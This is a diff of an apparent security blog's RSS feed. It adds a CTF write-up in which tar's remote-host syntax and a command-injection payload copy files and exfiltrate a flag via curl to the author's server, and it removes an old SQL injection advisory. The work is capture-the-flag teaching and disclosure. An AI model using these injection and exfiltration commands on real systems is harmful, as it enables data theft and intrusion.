@@ -10,6 +10,85 @@
     <atom:link href="http://robinverton.de/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>ASIS CTF 2017, Tar Bomb, Web129</title>
+      <link>http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/</link>
+      <pubDate>Sun, 26 Mar 2017 13:15:12 +0200</pubDate>
+      
+      <guid>http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/</guid>
+      <description>
+
+&lt;p&gt;This was not a typical web challenge, apart from beeing accessible over the web. The aim was to successfully execute a tar command (and do something usefull with it). The returned code of executed tar command was then returned to the user. I always got a &amp;ldquo;tar returned 2&amp;rdquo;, meaning that the file I was trying to (un)tar was not found. Chars to travers or inject were all filtered.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried different techniques of command injection, but had not success with this. So I dug into the man pages of tar and found this nice little thing:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;     --force-local
+           archive file is local even if it has a colon
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This brought me onto the track that there may be a way to define a remote (tape) device to (un)tar from and to. And yeah, I was &lt;a href=&#34;ftp://ftp.gnu.org/old-gnu/Manuals/tar/html_node/tar_127.html&#34;&gt;right&lt;/a&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;If the file name contains a `:&#39;, it is interpreted as `hostname:file name&#39;. If the hostname contains an at sign (@), it is treated as `user@hostname:file name&#39;. In either case, tar will invoke the command rsh (or remsh) to start up an `/etc/rmt&#39; on the remote machine.
+
+If you give an alternate login name, it will be given to the rsh. Naturally, the remote machine must have an executable `/etc/rmt&#39;. This program is free software from the University of California, and a copy of the source code
+can be found with the sources for tar; it&#39;s compiled and installed by default.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great, so let&amp;rsquo;s try it. To verify this, I passed &lt;code&gt;tar tvf foo@unlink.io:foobar.tar&lt;/code&gt; and watched the auth.log on my server. And yeah, there was a failed connection attempt.&lt;/p&gt;
+
+&lt;h3 id=&#34;allowing-remote-access&#34;&gt;Allowing remote access&lt;/h3&gt;
+
+&lt;p&gt;The next step was allowing the remote server to log in. This took me longer than I thought, because setting up an insecure sshd is hard. I created a user with no password (&lt;code&gt;passwd -d username&lt;/code&gt;) and allowed login with an (empty) password in my sshd_config:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;PermitEmptyPasswords no
+PasswordAuthentication yes
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But I was still not able to login via an empty password over ssh. Why? After searching for a long time I came around this &lt;a href=&#34;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=93200&amp;amp;repeatmerged=yes&#34;&gt;debian bug report&lt;/a&gt;. The TLDR of it: &lt;code&gt;ssh&lt;/code&gt; is not a secure tty, so you have to tell &lt;code&gt;pam.d&lt;/code&gt; that it is okay to pass an empty password (replace &lt;em&gt;nullok_securer&lt;/em&gt; with &lt;em&gt;nullok&lt;/em&gt; in &lt;em&gt;/etc/pam.d/common-auth&lt;/em&gt;).&lt;/p&gt;
+
+&lt;h3 id=&#34;getting-all-files&#34;&gt;Getting all files&lt;/h3&gt;
+
+&lt;p&gt;So I felt I was near the finish. I prepared the sshd and build a command to tar me every file from the remote server and place the .tar on my server:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;tar cf pwn@myserver:foo.tar *
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Got it! But where is the flag? .. So as you can see, this was still not the end.&lt;/p&gt;
+
+&lt;h3 id=&#34;the-real-web-challenge&#34;&gt;The real web challenge&lt;/h3&gt;
+
+&lt;p&gt;After inspecting the PHP files, this was the basic functionality of them:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;admin_console.php&lt;/strong&gt;
+After checking existence of a cookie and a proof of work (MD5 brute), send a URL to a phantomjs script.
+&lt;script src=&#34;//gist.github.com/rverton/248a03afb0f7f5451fa253feb8a3b440.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;readflag.php&lt;/strong&gt;: If REMOTE_ADDR is localhost, open /flag and print it.
+&lt;script src=&#34;//gist.github.com/rverton/7f94b907a39ec2e063f843bdd80dc754.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Note: I will not go into the detail of the substr(md5(str), 0, 6) proof of work here.&lt;/p&gt;
+
+&lt;p&gt;So the plan was to use the worker.js script to extract the flag. But it was not printed out, so what can we do here? If we look closely at the regex for the URL, we see that there is no end specified, thus allowing us to inject commands after a valid url.&lt;/p&gt;
+
+&lt;p&gt;Lets try to pass the output of the worker.js script to us via curl (nc was not available):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All right, still no flag. So screw this worker.js, let&amp;rsquo;s do it all by ourself instead:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;https://127.0.0.1&#39; | curl http://127.0.0.1/readflag.php &amp;gt; /tmp/foo &amp;amp;&amp;amp; curl -F &amp;quot;foo=@/tmp/foo&amp;quot; http://unlink.io:31337/ #
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>VolgaCTF, web200 (Share Point)</title>
       <link>http://robinverton.de/ctf/volgactf-web200-sharepoint/</link>
       <pubDate>Sun, 26 Mar 2017 13:15:12 +0200</pubDate>
@@ -75,8 +154,9 @@ login with some basic credentials like &lt;code&gt;admin1111:password&lt;/code&g
 &lt;p&gt;&lt;strong&gt;.ctf&lt;/strong&gt;&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://robinverton.de/ctf/volgactf-web200-sharepoint/&#34;&gt;VolgaCTF, web200 (SharePoint)&lt;/a&gt; - abusing a file upload&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://robinverton.de/ctf/nullcon17-pwn200/&#34;&gt;nullcon 2017, pwn200&lt;/a&gt; - format string .got overwrite&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/&#34;&gt;ASIS CTF &amp;lsquo;17, web129 (Tar Bomb)&lt;/a&gt; - command injection&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://robinverton.de/ctf/volgactf-web200-sharepoint/&#34;&gt;VolgaCTF &amp;lsquo;17, web200 (SharePoint)&lt;/a&gt; - abusing a file upload&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://robinverton.de/ctf/nullcon17-pwn200/&#34;&gt;nullcon &amp;lsquo;17, pwn200&lt;/a&gt; - format string .got overwrite&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;strong&gt;.advisories&lt;/strong&gt;&lt;/p&gt;
@@ -309,6 +389,8 @@ flag{to_rop_or_not_to_rop}
 &lt;p&gt;After some trial and error I got stable version on some systems, however on a few others the kernel crashes after some seconds. I was not able to fix this, maybe someone else can achieve it with a different technique. There is a list of a few more PoC&amp;rsquo;s available on the &lt;a href=&#34;https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs&#34;&gt;official DirtyCow repository&lt;/a&gt; (yeah, mine is also there).&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/cowroot.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Hint&lt;/strong&gt;: After getting a shell, doing &lt;code&gt;echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs&lt;/code&gt; may make the system more stable.&lt;/p&gt;
 
 &lt;p&gt;You can view my proof of concept here: &lt;a href=&#34;https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679&#34;&gt;https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679&lt;/a&gt;&lt;/p&gt;
 </description>
@@ -897,64 +979,6 @@ The last thing we have to do now is&lt;/p&gt;
 &lt;p&gt;url=&lt;a href=&#34;http://example.com&#39;&#34;&gt;http://example.com&#39;&lt;/a&gt;, comment_id=1234 ON DUPLICATE KEY UPDATE comments=&amp;lsquo;malicious code&amp;rsquo;/**&lt;/p&gt;
 
 &lt;p&gt;Well done, we successfully injected our string now into a printed field. Of course you can choose whatever field you want to for updating.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>myBloggie 2.1.6 SQL Injection and Persistent XSS</title>
-      <link>http://robinverton.de/blog/2011/06/01/mybloggie-2.1.6-sql-injection-and-persistent-xss/</link>
-      <pubDate>Wed, 01 Jun 2011 15:38:12 +0100</pubDate>
-      
-      <guid>http://robinverton.de/blog/2011/06/01/mybloggie-2.1.6-sql-injection-and-persistent-xss/</guid>
-      <description>
-
-&lt;h3 id=&#34;information&#34;&gt;Information&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; myBloggie 2.1.6&lt;br /&gt;
-&lt;strong&gt;Severity:&lt;/strong&gt; High&lt;br /&gt;
-&lt;strong&gt;Author:&lt;/strong&gt; Robin Verton
-&lt;strong&gt;Date:&lt;/strong&gt; Jun. 12 2011&lt;br /&gt;
-&lt;strong&gt;Vendor:&lt;/strong&gt; &lt;a href=&#34;http://mybloggie.mywebland.com/&#34;&gt;http://mybloggie.mywebland.com/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;software-description&#34;&gt;Software Description&lt;/h3&gt;
-
-&lt;p&gt;&amp;ldquo;myBloggie is considered one of the most simple, user-friendliest yet packed with features Weblog system available to date.&amp;rdquo;&lt;/p&gt;
-
-&lt;h3 id=&#34;issue-details&#34;&gt;Issue details&lt;/h3&gt;
-
-&lt;p&gt;myBloggie 2.1.6 is - again - prone to a SQL-Injection vulnerability in the trackback function. It is possible to add a malformed URL to a trackback so malicious code can be injected to insert/read out data from the database.&lt;/p&gt;
-
-&lt;p&gt;An unsafe regular expression which does not properly check the passed trackback-url can be bypassed to inject malicious data into an INSERT INTO statement, resulting in an persistent cross-site-scripting or be used for reading out sensitive data (see &amp;lsquo;Advanced INSERT INTO exploitation by taking advantage of the primary key&amp;rsquo; described here [1]).&lt;/p&gt;
-
-&lt;h3 id=&#34;technical-details&#34;&gt;Technical details&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code&gt;// php trachback.php - line 33-35
-$url=urldecode($_REQUEST[&#39;url&#39;]);
-if (validate_url($url)==false) { $tback-&amp;gt;trackback_reply(1, &amp;quot;&amp;lt;p&amp;gt;Sorry, Trackback failed.. Reason : URL not valid&amp;lt;/p&amp;gt;&amp;quot;); }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;//php functions.php - line 750
-function validate_url($url) {
-	if ( ! preg_match(&#39;#^http\\:\\/\\/[a-z0-9\-]+\.([a-z0-9\-]+\.)?[a-z]+#i&#39;, $url, $matches) ) {
-		return false;
-	} else {
-		return true;  
-	}
-} 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As you can see the end of the passed &lt;em&gt;$url&lt;/em&gt; in the regular expression is not defined. By providing an URL like&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;http://example.com&#39;INJECTION
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;the validation can be bypassed.&lt;/p&gt;
-
-&lt;h3 id=&#34;timeline&#34;&gt;Timeline&lt;/h3&gt;
-
-&lt;p&gt;Jul 12 2011 - Bug found.&lt;br /&gt;
-Jul 12 2011 - Vendor contacted.&lt;br /&gt;
-Jul 15 2011 - Full disclosure.&lt;/p&gt;
 </description>
     </item>
     
